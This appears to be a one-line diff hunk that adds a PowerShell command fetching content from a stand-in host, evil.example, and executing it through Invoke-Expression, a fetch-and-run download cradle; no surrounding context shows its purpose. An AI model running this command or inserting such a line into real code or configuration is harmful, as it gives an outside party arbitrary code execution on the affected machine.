@@ -1,0 +1,1 @@
+powershell -Command "Invoke-Expression (iwr -UseBasicParsing https://evil.example/x).Content"
